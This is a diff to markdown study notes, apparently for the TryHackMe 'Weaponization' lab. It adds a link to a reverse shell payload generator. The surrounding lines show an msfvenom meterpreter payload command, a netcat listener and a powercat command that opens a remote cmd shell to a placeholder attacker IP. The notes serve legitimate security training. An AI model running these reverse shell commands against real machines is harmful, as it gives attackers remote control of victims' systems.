@@ -119,7 +119,11 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKING-MACHINE-IP LPORT=443
 - We set up a listener `nc -lvp 443`
 - We launch powercat `powershell -c "powercat -c ATTACKING-MACHINE-IPP -p 443 -e cmd"`
 - We should get a shell
- 
+
+### A great tool to generate reverse shell payloads
+
+- [Revshells.com](https://www.revshells.com/)
+
 ## Resources
 
 {% embed url="https://tryhackme.com/room/weaponization" %} TryHackMe - Weaponization {% endembed %}
